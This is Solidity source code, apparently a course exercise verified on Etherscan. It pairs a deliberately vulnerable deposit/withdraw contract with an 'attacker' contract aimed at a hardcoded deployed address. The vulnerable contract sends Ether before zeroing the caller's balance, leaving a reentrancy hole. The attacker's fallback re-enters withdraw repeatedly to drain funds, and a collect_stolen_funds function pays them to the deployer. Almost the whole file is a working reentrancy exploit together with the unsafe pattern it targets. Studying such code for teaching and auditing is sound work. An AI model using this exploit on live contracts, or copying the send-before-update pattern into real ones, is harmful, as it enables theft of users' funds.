/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

pragma solidity ^0.6.0;

contract vunerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    // we don't attack deposit

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");
        // attack here and call fallback() function beofre balance is set to 0
        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract attacker {

    vunerable deployed = vunerable(address(0xEB81D9a87BbbBf4066be04AdDaDbF03410F1F58d)); // already deployed contract address

    uint limit = 0;
    address owner;                                           // creates a address variable

    constructor() public {
        owner = msg.sender;                                  // one time run that sets the owner's address
        // deployed owner's address
    }

    fallback () external payable {
        if (limit < 4) {
            limit++;
            deployed.withdraw();
        }
    }

    function attack() public payable {                                  
        // deployed.deposit.value(msg.value)();    
        deployed.deposit{value:msg.value}();            // check with professor      
        deployed.withdraw();                            // this allows me to skip having my balance set to 0
    }

    function collect_stolen_funds() public {
        // You need to send the stolen funds to your account i.e. the owner's address
        // we want only the deployer of the contract to be able to withdraw the money
        if (msg.sender == owner) {
            // withdraw to my address
            // msg.sender.call.value(this.balance)("");    // a way to send the value

            // msg.sender.send(address(this.balance));
            msg.sender.transfer(address(this).balance);

            // limit = 0;                                      // reset limit to make contract redeployable
        }
    }
}